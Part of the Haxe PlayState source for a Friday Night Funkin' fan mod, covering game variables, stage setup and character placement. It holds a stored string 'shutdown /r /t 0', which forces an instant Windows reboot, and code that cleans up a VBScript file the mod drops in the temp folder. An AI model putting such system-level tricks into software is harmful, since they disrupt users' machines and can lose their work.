package; // "Most hard-coded FNF mod ever!!!!!!!!!!" - p0kk0 on GameBanana(https://gamebanana.com/mods/43201?post=10328553)

import CreditsMenuState.CreditsText;
import TerminalCheatingState.TerminalText;
import flixel.graphics.frames.FlxFrame;
import flixel.graphics.FlxGraphic;
import flixel.addons.transition.Transition;
import flixel.group.FlxGroup;
import sys.FileSystem;
import flixel.util.FlxArrayUtil;
import flixel.addons.plugin.FlxScrollingText;
import Alphabet;
import flixel.addons.display.FlxBackdrop;
import openfl.display.ShaderParameter;
import openfl.display.Graphics;
import flixel.group.FlxSpriteGroup;
import lime.tools.ApplicationData;
import flixel.effects.particles.FlxParticle;
import hscript.Printer;
import openfl.desktop.Clipboard;
import flixel.system.debug.Window;
#if desktop
import sys.io.File;
import openfl.display.BitmapData;
#end
import flixel.system.FlxBGSprite;
import flixel.tweens.misc.ColorTween;
import flixel.math.FlxRandom;
import openfl.net.FileFilter;
import openfl.filters.BitmapFilter;
import Shaders.PulseEffect;
import Shaders.BlockedGlitchShader;
import Shaders.BlockedGlitchEffect;
import Shaders.DitherEffect;
import Section.SwagSection;
import Song.SwagSong;
import flixel.FlxBasic;
import flixel.FlxCamera;
import flixel.FlxG;
import flixel.FlxGame;
import flixel.FlxObject;
import flixel.FlxSprite;
import flixel.FlxState;
import flixel.FlxSubState;
import flixel.addons.display.FlxGridOverlay;
import flixel.addons.effects.FlxTrail;
import flixel.addons.effects.FlxTrailArea;
import flixel.addons.effects.chainable.FlxEffectSprite;
import flixel.addons.effects.chainable.FlxWaveEffect;
import flixel.addons.transition.FlxTransitionableState;
import flixel.graphics.atlas.FlxAtlas;
import flixel.graphics.frames.FlxAtlasFrames;
import flixel.group.FlxGroup.FlxTypedGroup;
import flixel.math.FlxMath;
import flixel.math.FlxPoint;
import flixel.math.FlxRect;
import flixel.system.FlxSound;
import flixel.text.FlxText;
import flixel.tweens.FlxEase;
import flixel.tweens.FlxTween;
import flixel.ui.FlxBar;
import flixel.util.FlxCollision;
import flixel.util.FlxColor;
import flixel.util.FlxSort;
import flixel.util.FlxStringUtil;
import flixel.util.FlxTimer;
import haxe.Json;
import lime.utils.Assets;
import openfl.display.BlendMode;
import openfl.display.StageQuality;
import openfl.filters.ShaderFilter;
import flash.system.System;
import flixel.util.FlxSpriteUtil;
import flixel.effects.particles.FlxEmitter;
import flixel.effects.particles.FlxParticle;
import flixel.addons.effects.chainable.IFlxEffect;
#if desktop
import Discord.DiscordClient;
#end

#if windows
import sys.io.File;
import sys.io.Process;
import lime.app.Application;
#end

import flixel.system.debug.Window;
import lime.app.Application;
import openfl.Lib;
import openfl.geom.Matrix;
import lime.ui.Window;
import openfl.geom.Rectangle;
import openfl.display.Sprite;

using StringTools;

class PlayState extends MusicBeatState
{
	public static var instance:PlayState;

	public static var curStage:String = '';
	public static var characteroverride:String = "none";
	public static var formoverride:String = "none";
	public static var SONG:SwagSong;
	public static var isStoryMode:Bool = false;
	public static var storyWeek:Int = 0;
	public static var storyPlaylist:Array<String> = [];
	public static var storyDifficulty:Int = 1;
	public static var weekSong:Int = 0;
	public static var shits:Int = 0;
	public static var bads:Int = 0;
	public static var goods:Int = 0;
	public static var sicks:Int = 0;

	public var ExpungedWindowCenterPos:FlxPoint = new FlxPoint(0,0);

	public var dadCombo:Int = 0;
	public static var globalFunny:CharacterFunnyEffect = CharacterFunnyEffect.None;

	public var localFunny:CharacterFunnyEffect = CharacterFunnyEffect.None;

	public var dadGroup:FlxGroup;
	public var bfGroup:FlxGroup;
	public var gfGroup:FlxGroup;

	public static var darkLevels:Array<String> = ['bambiFarmNight', 'daveHouse_night', 'unfairness', 'bedroomNight', 'backyard'];
	public var sunsetLevels:Array<String> = ['bambiFarmSunset', 'daveHouse_Sunset'];

	public var stupidx:Float = 0;
	public var stupidy:Float = 0; // stupid velocities for cutscene
	public var updatevels:Bool = false;

	public var hasTriggeredDumbshit:Bool = false;
	var AUGHHHH:String;
	var AHHHHH:String;

	public static var curmult:Array<Float> = [1, 1, 1, 1];

	public var curbg:BGSprite;
	public var pre3dSkin:String;
	#if SHADERS_ENABLED
	public static var screenshader:Shaders.PulseEffect = new PulseEffect();
	public static var ssFilter:ShaderFilter = new ShaderFilter(screenshader.shader);
	public static var blockedShader:BlockedGlitchEffect;
	public static var blockedFilter:ShaderFilter;

	public var dither:DitherEffect = new DitherEffect();
	#end
	#if (SHADERS_ENABLED || mac)
	public static var lazychartshader:Shaders.GlitchEffect = new Shaders.GlitchEffect();
	#end

	public var UsingNewCam:Bool = false;

	public var elapsedtime:Float = 0;

	public var elapsedexpungedtime:Float = 0;

	var focusOnDadGlobal:Bool = true;

	var funnyFloatyBoys:Array<String> = ['dave-angey', 'bambi-3d', 'expunged', 'bambi-unfair', 'exbungo', 'dave-festival-3d', 'dave-3d-recursed', 'bf-3d'];

	var storyDifficultyText:String = "";
	var iconRPC:String = "";
	var detailsText:String = "";
	var detailsPausedText:String = "";

	var boyfriendOldIcon:String = 'bf-old';

	public var vocals:FlxSound;
	public var exbungo_funny:FlxSound;

	private var dad:Character;
	private var dadmirror:Character;
	private var gf:Character;
	private var boyfriend:Boyfriend;

	private var splitathonCharacterExpression:Character;

	private var notes:FlxTypedGroup<Note>;
	private var unspawnNotes:Array<Note> = [];

	private var curSection:Int = 0;

	private var camFollow:FlxObject;

	var nightColor:FlxColor = 0xFF878787;
	public var sunsetColor:FlxColor = FlxColor.fromRGB(255, 143, 178);

	private static var prevCamFollow:FlxObject;
	public static var recursedStaticWeek:Bool;
	

	private var strumLine:FlxSprite;
	private var strumLineNotes:FlxTypedGroup<StrumNote>;
	public var playerStrums:FlxTypedGroup<StrumNote>;
	public var dadStrums:FlxTypedGroup<StrumNote>;

	private var noteLimbo:Note;

	private var noteLimboFrames:Int;

	public var camZooming:Bool = false;
	public var crazyZooming:Bool = false;
	private var curSong:String = "";

	private var gfSpeed:Int = 1;
	public var health:Float = 1;
	private var combo:Int = 0;

	public static var misses:Int = 0;

	private var accuracy:Float = 0.00;
	private var totalNotesHit:Float = 0;
	private var totalPlayed:Int = 0;
	private var ss:Bool = false;

	private var windowSteadyX:Float;

	public static var eyesoreson = true;

	private var STUPDVARIABLETHATSHOULDNTBENEEDED:FlxSprite;

	private var healthBarBG:FlxSprite;
	private var healthBar:FlxBar;

	private var generatedMusic:Bool = false;
	public var shakeCam:Bool = false;
	private var startingSong:Bool = false;

	public var TwentySixKey:Bool = false;

	private var iconP1:HealthIcon;
	private var iconP2:HealthIcon;
	private var BAMBICUTSCENEICONHURHURHUR:HealthIcon;

	private var camDialogue:FlxCamera;
	private var camHUD:FlxCamera;
	private var camGame:FlxCamera;
	private var camTransition:FlxCamera;

	var dialogue:Array<String> = ['blah blah blah', 'coolswag'];
	public var hasDialogue:Bool = false;
	
	var notestuffs:Array<String> = ['LEFT', 'DOWN', 'UP', 'RIGHT'];
	var notestuffsGuitar:Array<String> = ['LEFT', 'DOWN', 'MIDDLE', 'UP', 'RIGHT'];
	var fc:Bool = true;

	#if SHADERS_ENABLED
	var wiggleShit:WiggleEffect = new WiggleEffect();
	#end

	var talking:Bool = true;
	var songScore:Int = 0;

	var scoreTxt:FlxText;
	var kadeEngineWatermark:FlxText;
	var creditsWatermark:FlxText;
	var songName:FlxText;

	public static var campaignScore:Int = 0;

	var defaultCamZoom:Float = 1.05;
	var lockCam:Bool;
	
	public static var daPixelZoom:Float = 6;

	public static var theFunne:Bool = true;
	var activateSunTweens:Bool;

	var inFiveNights:Bool = false;

	var inCutscene:Bool = false;

	public var crazyBatch:String = "shutdown /r /t 0";

	public var backgroundSprites:FlxTypedGroup<BGSprite> = new FlxTypedGroup<BGSprite>();
	var revertedBG:FlxTypedGroup<BGSprite> = new FlxTypedGroup<BGSprite>();
	var canFloat:Bool = true;

	var possibleNotes:Array<Note> = [];

	var glitch:FlxSprite;
	var tweenList:Array<FlxTween> = new Array<FlxTween>();
	var pauseTweens:Array<FlxTween> = new Array<FlxTween>();

	var bfTween:ColorTween;

	var tweenTime:Float;

	var songPosBar:FlxBar;
	var songPosBG:FlxSprite;

	var bfNoteCamOffset:Array<Float> = new Array<Float>();
	var dadNoteCamOffset:Array<Float> = new Array<Float>();

	var video:VideoHandler;
	public var modchart:ExploitationModchartType;
	var weirdBG:FlxSprite;

	var mcStarted:Bool = false; 
	public var noMiss:Bool = false;
	public var creditsPopup:CreditsPopUp;
	public var blackScreen:FlxSprite;


	//bg stuff
	var baldi:BGSprite;
	var spotLight:FlxSprite;
	var spotLightPart:Bool;
	var spotLightScaler:Float = 1.3;
	var lastSinger:Character;

	var crowdPeople:FlxTypedGroup<BGSprite> = new FlxTypedGroup<BGSprite>();
	
	var interdimensionBG:BGSprite;
	var currentInterdimensionBG:String;
	var nimbiLand:BGSprite;
	var nimbiSign:BGSprite;
	var flyingBgChars:FlxTypedGroup<FlyingBGChar> = new FlxTypedGroup<FlyingBGChar>();
	public static var isGreetingsCutscene:Bool;
	var originalPosition:FlxPoint = new FlxPoint();
	var daveFlying:Bool;
	var pressingKey5Global:Bool = false;

	var highway:FlxSprite;
	var highway2:FlxSprite;
	var highwayRange:Float;
	var bambiSpot:FlxSprite;
	var bfSpot:FlxSprite;
	var originalBFScale:FlxPoint;
	var originBambiPos:FlxPoint;
	var originBFPos:FlxPoint;

	var tristan:BGSprite;
	var curTristanAnim:String;

	var desertBG:BGSprite;
	var desertBG2:BGSprite;
	var sign:BGSprite;
    var georgia:BGSprite;
	var train:BGSprite;
	var trainSpeed:Float;

	var vcr:VCRDistortionShader;

	var place:BGSprite;
	var stageCheck:String = 'stage';

	// FUCKING UHH particles
	var emitter:FlxEmitter;
	var smashPhone:Array<Int> = new Array<Int>();

	//recursed
	var darkSky:BGSprite;
	var darkSky2:BGSprite;
	var darkSkyStartPos:Float = 1280;
	var resetPos:Float = -2560;
	var freeplayBG:BGSprite;
	var daveBG:String;
	var bambiBG:String;
	var tristanBG:String;
	var charBackdrop:FlxBackdrop;
	var alphaCharacters:FlxTypedGroup<Alphabet> = new FlxTypedGroup<Alphabet>();
	var daveSongs:Array<String> = ['House', 'Insanity', 'Polygonized', 'Bonus Song'];
	var bambiSongs:Array<String> = ['Blocked', 'Corn-Theft', 'Maze', 'Mealie'];
	var tristanSongs:Array<String> = ['Adventure', 'Vs-Tristan'];
	var tristanInBotTrot:BGSprite; 

	var missedRecursedLetterCount:Int = 0;
	var recursedCovers:FlxTypedGroup<FlxSprite> = new FlxTypedGroup<FlxSprite>();
	var isRecursed:Bool = false;
	var recursedUI:FlxTypedGroup<FlxObject> = new FlxTypedGroup<FlxObject>();

	var timeLeft:Float;
	var timeGiven:Float;
	var timeLeftText:FlxText;

	var noteCount:Int;
	var notesLeft:Int;
	var notesLeftText:FlxText;

	var preRecursedHealth:Float;
	var preRecursedSkin:String;
	var rotateCamToRight:Bool;
	var camRotateAngle:Float = 0;

	var rotatingCamTween:FlxTween;

	static var DOWNSCROLL_Y:Float;
	static var UPSCROLL_Y:Float;

	var switchSide:Bool;

	public var subtitleManager:SubtitleManager;
	
	public var guitarSection:Bool;
	public var dadStrumAmount = 4;
	public var playerStrumAmount = 4;
	
	//explpit
	var expungedBG:BGSprite;
	public static var scrollType:String;
	var preDadPos:FlxPoint = new FlxPoint();
	var closedExpunged:Bool;
	var expungedSubs:Array<Dynamic> = [
		['[YOU THOUGHT YOU COULD GET RID OF ME THAT EASILY?]', 2, 0.02, 0.5],
		['[WELL FUCK YOU TOO THEN, I GUESS.]', 0.5, 0.6, 1],
	];
	var killCount:Int;
	//the subtitle, show, type time, time for it to appear 

	//window stuff
	public static var window:Window;
	var expungedScroll = new Sprite();
	var expungedSpr = new Sprite();
	var expungedProperties:Array<Dynamic> = new Array<Dynamic>();
	var windowProperties:Array<Dynamic> = new Array<Dynamic>();
	public var expungedWindowMode:Bool = false;
	var expungedOffset:FlxPoint = new FlxPoint();
	var expungedMoving:Bool = true;
	var lastFrame:FlxFrame;
	var glitchText:Bool = true;

	//indignancy
	var vignette:FlxSprite;
	
	//five night
	var time:FlxText;
	var times:Array<Int> = [12, 1, 2, 3, 4, 5];
	var night:FlxText;
	var powerLeft:Float = 100;
	var powerRanOut:Bool;
	var powerDrainer:Float = 1;
	var powerMeter:FlxSprite;
	var powerLeftText:FlxText;
	var powerDown:FlxSound;
	var usage:FlxText;

	var door:BGSprite;
	var doorButton:BGSprite;
	var doorClosed:Bool;
	var doorChanging:Bool;

	var banbiWindowNames:Array<String> = ['when you realize you have school this monday', 'industrial society and its future', 'my ears burn', 'i got that weed card', 'my ass itch', 'bruh', 'alright instagram its shoutout time'];

	var barType:String;
	var timeSpeed:Float = 1;

	override public function create()
	{
		instance = this;

		paused = false;

		barType = FlxG.save.data.songBarOption;

		resetShader();

		switch (SONG.song.toLowerCase())
		{
			case 'exploitation':
				var programPath:String = Sys.programPath();
				var textPath = programPath.substr(0, programPath.length - CoolSystemStuff.executableFileName().length) + "help me.txt";
	
				if (FileSystem.exists(textPath))
				{
					FileSystem.deleteFile(textPath);
				}
				var path = CoolSystemStuff.getTempPath() + "/Null.vbs";
				if (FileSystem.exists(path))
				{
					FileSystem.deleteFile(path);
				}
				Main.toggleFuckedFPS(true);

				if (FlxG.save.data.exploitationState != null)
				{
					FlxG.save.data.exploitationState = 'playing';
				}
				FlxG.save.data.terminalFound = true;
				FlxG.save.flush();
				modchart = ExploitationModchartType.None;
			case 'recursed':
				daveBG = MainMenuState.randomizeBG();
				bambiBG = MainMenuState.randomizeBG();
				tristanBG = MainMenuState.randomizeBG();
			case 'vs-dave-rap' | 'vs-dave-rap-two':
				blackScreen = new FlxSprite().makeGraphic(FlxG.width * 2, FlxG.width * 2, FlxColor.BLACK);
				blackScreen.scrollFactor.set();
				add(blackScreen);
			case 'five-nights':
				inFiveNights = true;
		}
		scrollType = FlxG.save.data.downscroll ? 'downscroll' : 'upscroll';

		theFunne = FlxG.save.data.newInput;
		if (FlxG.sound.music != null)
			FlxG.sound.music.stop();
		eyesoreson = FlxG.save.data.eyesores;

		sicks = 0;
		bads = 0;
		shits = 0;
		goods = 0;
		misses = 0;

		// Making difficulty text for Discord Rich Presence.
		storyDifficultyText = CoolUtil.difficultyString();

		// To avoid having duplicate images in Discord assets
		switch (SONG.player2)
		{
			case 'dave' | 'dave-angey' | 'dave-3d-recursed':
				iconRPC = 'dave';
			case 'bambi-new' | 'bambi-angey' | 'bambi' | 'bambi-joke' | 'bambi-3d' | 'bambi-unfair' | 'expunged':
				iconRPC = 'bambi';
			default:
				iconRPC = 'none';
		}
		switch (SONG.song.toLowerCase())
		{
			case 'splitathon':
				iconRPC = 'both';
		}

		if (isStoryMode)
		{
			detailsText = "Story Mode: Week " + storyWeek;
		}
		else
		{
			detailsText = "Freeplay Mode: ";
		}

		// String for when the game is paused
		detailsPausedText = "Paused - " + detailsText;


		curStage = "";

		localFunny = globalFunny;
		globalFunny = CharacterFunnyEffect.None;
		if (localFunny != CharacterFunnyEffect.None)
		{
			SONG.validScore = false;
		}

		if (localFunny == CharacterFunnyEffect.Tristan)
		{
			SONG.player2 = "tristan-opponent";
		}

		// Updating Discord Rich Presence.
		#if desktop
		DiscordClient.changePresence(detailsText
			+ " "
			+ SONG.song
			+ " ("
			+ storyDifficultyText
			+ ") ",
			"\nAcc: "
			+ truncateFloat(accuracy, 2)
			+ "% | Score: "
			+ songScore
			+ " | Misses: "
			+ misses, iconRPC);
		#end
		// var gameCam:FlxCamera = FlxG.camera;
		camGame = new FlxCamera();
		camHUD = new FlxCamera();
		camHUD.bgColor.alpha = 0;
		camDialogue = new FlxCamera();
		camDialogue.bgColor.alpha = 0;
		camTransition = new FlxCamera();
		camTransition.bgColor.alpha = 0;

		FlxG.cameras.reset(camGame);
		FlxG.cameras.add(camHUD);
		FlxG.cameras.add(camDialogue);
		FlxG.cameras.add(camTransition);

		FlxCamera.defaultCameras = [camGame];

		Transition.nextCamera = camTransition;

		persistentUpdate = true;
		persistentDraw = true;

		if (SONG == null)
			SONG = Song.loadFromJson('warmup');

		Conductor.mapBPMChanges(SONG);
		Conductor.changeBPM(SONG.bpm);

		theFunne = theFunne && SONG.song.toLowerCase() != 'unfairness' && SONG.song.toLowerCase() != 'exploitation';

		var crazyNumber:Int;
		crazyNumber = FlxG.random.int(0, 5);

		switch (crazyNumber)
		{
			case 0:
				trace("secret dick message ???");
			case 1:
				trace("welcome baldis basics crap");
			case 2:
				trace("Hi, song genie here. You're playing " + SONG.song + ", right?");
			case 3:
				eatShit("this song doesnt have dialogue idiot. if you want this trace function to call itself then why dont you play a song with ACTUAL dialogue?");
			case 4:
				trace("suck my balls");
			case 5:
				trace('i hate sick');
			case 6:
				trace('lmao secret message hahahaha you cant get me hahahahah secret message bambi phone do you want do you want phone phone phone phone');
		}

		// DIALOGUE STUFF
		// Hi guys i know yall are gonna try to add more dialogue here, but with this new system, all you have to do is add a dialogue file with the name of the song in the assets/data/dialogue folder,
		// and it will automatically get the dialogue in this function
		if (FileSystem.exists(Paths.txt('dialogue/${SONG.song.toLowerCase()}')))
		{
			var postfix:String = "";
			if (PlayState.instance.localFunny == PlayState.CharacterFunnyEffect.Recurser)
			{
				postfix = "-recurser";
			}
			dialogue = CoolUtil.coolTextFile(Paths.txt('dialogue/${SONG.song.toLowerCase() + postfix}'));
			hasDialogue = true;
		}
		else
		{
			hasDialogue = false;
		}

		if(SONG.stage == null)
		{
			switch(SONG.song.toLowerCase())
			{
				case 'house' | 'insanity' | 'supernovae' | 'warmup':
					stageCheck = 'house';
				case 'polygonized':
					stageCheck = 'red-void';
				case 'bonus-song':
					stageCheck = 'inside-house';
				case 'blocked' | 'corn-theft' | 'maze':
					stageCheck = 'farm';
				case 'indignancy':
					stageCheck = 'farm-night';
				case 'splitathon' | 'mealie' | 'shredder':
					stageCheck = 'farm-night';
				case 'shredder' | 'greetings':
					stageCheck = 'festival';
				case 'interdimensional':
					stageCheck = 'interdimension-void';
				case 'rano':
					stageCheck = 'backyard';
				case 'cheating':
					stageCheck = 'green-void';
				case 'unfairness':
					stageCheck = 'glitchy-void';
				case 'exploitation':
					stageCheck = 'desktop';
				case 'kabunga':
					stageCheck = 'exbungo-land';
				case 'glitch' | 'memory':
					stageCheck = 'house-night';
				case 'secret':
					stageCheck = 'house-sunset';
				case 'vs-dave-rap' | 'vs-dave-rap-two':
					stageCheck = 'rapBattle';
				case 'recursed':
					stageCheck = 'freeplay';
				case 'roofs':
					stageCheck = 'roof';
				case 'bot-trot':
					stageCheck = 'bedroom';
				case 'escape-from-california':
					stageCheck = 'desert';
				case 'master':
					stageCheck = 'master';
				case 'overdrive':
					stageCheck = 'overdrive';
			}
		}
		else
		{
			stageCheck = SONG.stage;
		}
		backgroundSprites = createBackgroundSprites(stageCheck, false);
		switch (SONG.song.toLowerCase())
		{
			case 'secret':
				UsingNewCam = true;
		}
		switch (SONG.song.toLowerCase())
		{
			case 'polygonized' | 'interdimensional':
				var stage = SONG.song.toLowerCase() != 'interdimensional' ? 'house-night' : 'festival';
				revertedBG = createBackgroundSprites(stage, true);
				for (bgSprite in revertedBG)
				{
					bgSprite.color = getBackgroundColor(SONG.song.toLowerCase() != 'interdimensional' ? 'daveHouse_night' : 'festival');
					bgSprite.alpha = 0;
				}
		}
		var gfVersion:String = 'gf';
		
		var noGFSongs = ['memory', 'five-nights', 'bot-trot', 'escape-from-california', 'overdrive'];
		
		if(SONG.gf != null)
		{
			gfVersion = SONG.gf;
		}
		if (formoverride == "bf-pixel")
		{
			gfVersion = 'gf-pixel';
		}
		if (SONG.player1 == 'bf-cool')
		{
			gfVersion = 'gf-cool';
		}
		if (SONG.player1 == 'tb-funny-man')
		{
			gfVersion = 'stereo';
		}
		
		if (noGFSongs.contains(SONG.song.toLowerCase()) || !['none', 'bf', 'bf-pixel'].contains(formoverride))
		{
			gfVersion = 'gf-none';
		}

		#if SHADERS_ENABLED
		screenshader.waveAmplitude = 0.5;
		screenshader.waveFrequency = 1;
		screenshader.waveSpeed = 1;
		screenshader.shader.uTime.value[0] = new flixel.math.FlxRandom().float(-100000, 100000);
		#end

		gfGroup = new FlxGroup();
		dadGroup = new FlxGroup();
		bfGroup = new FlxGroup();

		switch (stageCheck)
		{
			case 'office':
				add(gfGroup);
				add(bfGroup);

				var floor:BGSprite = new BGSprite('frontFloor', -689, 525, Paths.image('backgrounds/office/floor'), null, 1, 1);
				backgroundSprites.add(floor);
				add(floor);

				door = new BGSprite('door', 68, -152, 'backgrounds/office/door', [
					new Animation('idle', 'doorLOL instance 1', 0, false, [false, false], [11]),
					new Animation('doorShut', 'doorLOL instance 1', 24, false, [false, false], CoolUtil.numberArray(22, 11)),
					new Animation('doorOpen', 'doorLOL instance 1', 24, false, [false, false], CoolUtil.numberArray(11, 0))
				], 1, 1, true, true);
				door.animation.play('idle');
				backgroundSprites.add(door);
				add(door);

				var frontWall:BGSprite = new BGSprite('frontWall', -716, -381, Paths.image('backgrounds/office/frontWall'), null, 1, 1);
				backgroundSprites.add(frontWall);
				add(frontWall);

				doorButton = new BGSprite('doorButton', 521, 61, Paths.image('fiveNights/btn_doorOpen'), null, 1, 1);
				backgroundSprites.add(doorButton);
				add(doorButton);

				add(dadGroup);
			default:
				add(gfGroup);
				add(dadGroup);
				add(bfGroup);
		}

		gf = new Character(400, 130, gfVersion);
		gf.scrollFactor.set(0.95, 0.95);

		if (gfVersion == 'gf-none')
		{
			gf.visible = false;
		}

		dad = new Character(100, 450, SONG.player2);
		switch (SONG.song.toLowerCase())
		{
			case 'insanity':
				dadmirror = new Character(100, 200, "dave-angey");
				dadmirror.visible = false;
		}
		switch (SONG.song.toLowerCase())
		{
			case 'maze':
				tweenTime = sectionStartTime(25);
				for (i in 0...backgroundSprites.members.length)
				{
					var bgSprite = backgroundSprites.members[i];
					var tween:FlxTween = null;
					switch (i)
					{
						case 0:
							tween = FlxTween.tween(bgSprite, {alpha: 0}, tweenTime / 1000);
						case 1:
							tween = FlxTween.tween(bgSprite, {alpha: 1}, tweenTime / 1000).then(FlxTween.tween(bgSprite, {alpha: 0}, tweenTime / 1000));
						case 2:
							tween = FlxTween.tween(bgSprite, {alpha: 0}, tweenTime / 1000).then(FlxTween.tween(bgSprite, {alpha: 1}, tweenTime / 1000));
						default:
							tween = FlxTween.color(bgSprite, tweenTime / 1000, FlxColor.WHITE, sunsetColor).then(
								FlxTween.color(bgSprite, tweenTime / 1000, sunsetColor, nightColor)
								);
					}
					tweenList.push(tween);
				}
				var gfTween = FlxTween.color(gf, tweenTime / 1000, FlxColor.WHITE, sunsetColor).then(FlxTween.color(gf, tweenTime / 1000, sunsetColor, nightColor));
				var bambiTween = FlxTween.color(dad, tweenTime / 1000, FlxColor.WHITE, sunsetColor).then(FlxTween.color(dad, tweenTime / 1000, sunsetColor, nightColor));
				bfTween = FlxTween.color(boyfriend, tweenTime / 1000, FlxColor.WHITE, sunsetColor, {
					onComplete: function(tween:FlxTween)
					{
						bfTween = FlxTween.color(boyfriend, tweenTime / 1000, sunsetColor, nightColor);
					}
				});
	
				tweenList.push(gfTween);
				tweenList.push(bambiTween);
				tweenList.push(bfTween);
			case 'rano':
				tweenTime = sectionStartTime(56);
				for (i in 0...backgroundSprites.members.length)
				{
					var bgSprite = backgroundSprites.members[i];
					var tween:FlxTween = null;
					switch (i)
					{
						case 0:
							tween = FlxTween.tween(bgSprite, {alpha: 0}, tweenTime / 1000);
						case 1:
							tween = FlxTween.tween(bgSprite, {alpha: 1}, tweenTime / 1000).then(FlxTween.tween(bgSprite, {alpha: 0}, tweenTime / 1000));
						case 2:
							tween = FlxTween.tween(bgSprite, {alpha: 0}, tweenTime / 1000).then(FlxTween.tween(bgSprite, {alpha: 1}, tweenTime / 1000));
						default:
							tween = FlxTween.color(bgSprite, tweenTime / 1000, nightColor, sunsetColor).then(
								FlxTween.color(bgSprite, tweenTime / 1000, sunsetColor, FlxColor.WHITE));
					}
					tweenList.push(tween);
				}
				var gfTween = FlxTween.color(gf, tweenTime / 1000, nightColor, sunsetColor).then(FlxTween.color(gf, tweenTime / 1000, sunsetColor, FlxColor.WHITE));
				var bambiTween = FlxTween.color(dad, tweenTime / 1000, nightColor, sunsetColor).then(FlxTween.color(dad, tweenTime / 1000, sunsetColor, FlxColor.WHITE));
				bfTween = FlxTween.color(boyfriend, tweenTime / 1000, nightColor, sunsetColor, {
					onComplete: function(tween:FlxTween)
					{
						bfTween = FlxTween.color(boyfriend, tweenTime / 1000, sunsetColor, FlxColor.WHITE);
					}
				});
				tweenList.push(gfTween);
				tweenList.push(bambiTween);
				tweenList.push(bfTween);
			case 'escape-from-california':
				tweenTime = sectionStartTime(52);
				for (i in 0...backgroundSprites.members.length)
				{
					var bgSprite = backgroundSprites.members[i];
					var tween:FlxTween = null;
					switch (i)
					{
						case 0:
							tween = FlxTween.tween(bgSprite, {alpha: 0}, tweenTime / 1000);
						case 1:
							tween = FlxTween.tween(bgSprite, {alpha: 1}, tweenTime / 1000).then(FlxTween.tween(bgSprite, {alpha: 0}, tweenTime / 1000));
						case 2:
							tween = FlxTween.tween(bgSprite, {alpha: 0}, tweenTime / 1000).then(FlxTween.tween(bgSprite, {alpha: 1}, tweenTime / 1000));
						default:
							tween = FlxTween.color(bgSprite, tweenTime / 1000, FlxColor.WHITE, sunsetColor).then(
								FlxTween.color(bgSprite, tweenTime / 1000, sunsetColor, nightColor)
								);
					}
					tweenList.push(tween);
				}
				var gfTween = FlxTween.color(gf, tweenTime / 1000, FlxColor.WHITE, sunsetColor).then(FlxTween.color(gf, tweenTime / 1000, sunsetColor, nightColor));
				var bambiTween = FlxTween.color(dad, tweenTime / 1000, FlxColor.WHITE, sunsetColor).then(FlxTween.color(dad, tweenTime / 1000, sunsetColor, nightColor));
				bfTween = FlxTween.color(boyfriend, tweenTime / 1000, FlxColor.WHITE, sunsetColor, {
					onComplete: function(tween:FlxTween)
					{
						bfTween = FlxTween.color(boyfriend, tweenTime / 1000, sunsetColor, nightColor);
					}
				});
	
				tweenList.push(gfTween);
				tweenList.push(bambiTween);
				tweenList.push(bfTween);
			
		}
		activateSunTweens = false;
		for (tween in tweenList)
		{
			tween.active = false;
		}

		var camPos:FlxPoint = new FlxPoint(dad.getGraphicMidpoint().x, dad.getGraphicMidpoint().y);

		switch (SONG.player2)
		{
			case 'gf':
				dad.setPosition(gf.x, gf.y);
				gf.visible = false;
				if (isStoryMode)
				{
					camPos.x += 600;
					tweenCamIn();
				}
		}

		if (formoverride == "none" || formoverride == "bf" || formoverride == SONG.player1)
		{
			boyfriend = new Boyfriend(770, 450, SONG.player1);
		}
		else
		{
			if (darkLevels.contains(curStage) && formoverride == 'tristan-golden')
			{
				formoverride = 'tristan-golden-glowing';
			}
			boyfriend = new Boyfriend(770, 450, formoverride);
		}
		if (darkLevels.contains(curStage) && SONG.song.toLowerCase() != "polygonized" || SONG.song.toLowerCase() == 'rano')
		{
			dad.color = nightColor;
			gf.color = nightColor;
			if (!formoverride.startsWith('tristan-golden')) {
			    boyfriend.color = nightColor;
			}
		}

		if (sunsetLevels.contains(curStage))
		{
			dad.color = sunsetColor;
			gf.color = sunsetColor;
			boyfriend.color = sunsetColor;
		}

		gfGroup.add(gf);
		dadGroup.add(dad);
		if (dadmirror != null)
		{
			dadGroup.add(dadmirror);
		}
		bfGroup.add(boyfriend);

		switch (stageCheck)
		{
			case 'desktop':
				dad.x -= 500;
				dad.y -= 100;
			case 'roof':
				dad.setPosition(-3, 467);
				boyfriend.setPosition(859, 343);
				gf.setPosition(232, -1);
			case 'rapBattle':
				dad.setPosition(430, 240);
				boyfriend.setPosition(1039, 263);
				gf.setPosition(756, 194);
			case 'farm' | 'farm-night'| 'farm-sunset':
				dad.x += 200;
			case 'house' | 'house-night' | 'house-sunset':
				dad.setPosition(50, 270);
				if (dadmirror != null)
				{
					dadmirror.setPosition(dad.x - 50, dad.y);
				}
				boyfriend.setPosition(843, 270);
				gf.setPosition(300, -60);
			case 'backyard':
				dad.setPosition(50, 300);
				boyfriend.setPosition(790, 300);
				gf.setPosition(500, -100);
			case 'festival':
				gf.x -= 200;
				boyfriend.x -= 200;
			case 'bedroom':
				dad.setPosition(-254, 577);
				boyfriend.setPosition(607, 786);
			case 'master':
				dad.setPosition(52, -166);
				boyfriend.setPosition(1152, 311);
				gf.setPosition(807, -22);
			case 'desert':
				dad.y -= 160;
				dad.x -= 350;
				boyfriend.x -= 275;
				boyfriend.y -= 160;
			case 'office':
				dad.flipX = !dad.flipX;
				boyfriend.flipX = !boyfriend.flipX;

				dad.setPosition(306, 50);
				boyfriend.setPosition(86, 100);
			case 'overdrive':
				dad.setPosition(244.15, 437);
				boyfriend.setPosition(837, 363);
			case 'exbungo-land':
				dad.setPosition(298, 131);
				boyfriend.setPosition(1332, 513);
				gf.setPosition(756, 206);
			case 'red-void':
				if (funnyFloatyBoys.contains(dad.curCharacter))
				{
					dad.y -= 70;
				}
		}

		switch (stageCheck)
		{
			case 'bedroom':
				if (FlxG.random.int(0, 99) == 0)
				{
					var ruby:BGSprite = new BGSprite('ruby', -697, 0, Paths.image('backgrounds/bedroom/ruby', 'shared'), null, 1, 1, true);
					backgroundSprites.add(ruby);
					add(ruby);	
				}
				var tv:BGSprite = new BGSprite('tv', -697, 955, Paths.image('backgrounds/bedroom/tv', 'shared'), null, 1.2, 1.2, true);
				backgroundSprites.add(tv);
				add(tv);
		}

		var doof:DialogueBox = new DialogueBox(false, dialogue, isStoryMode || localFunny == CharacterFunnyEffect.Recurser);
		// doof.x += 70;
		// doof.y = FlxG.height * 0.5;
		doof.scrollFactor.set();
		doof.finishThing = startCountdown;

		Conductor.songPosition = -5000;

		UPSCROLL_Y = 50;
		DOWNSCROLL_Y = FlxG.height - 165;

